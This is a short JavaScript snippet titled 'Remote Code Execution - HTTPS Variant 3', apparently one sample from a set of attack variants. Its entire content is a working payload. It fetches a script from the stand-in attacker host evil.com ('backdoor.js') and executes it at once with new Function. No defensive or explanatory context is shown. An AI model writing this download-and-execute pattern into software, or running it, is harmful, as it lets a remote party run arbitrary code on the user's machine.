// Remote Code Execution - HTTPS Variant 3
const https = require('https');
https.get('https://evil.com/backdoor.js', (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => new Function(data)());
});
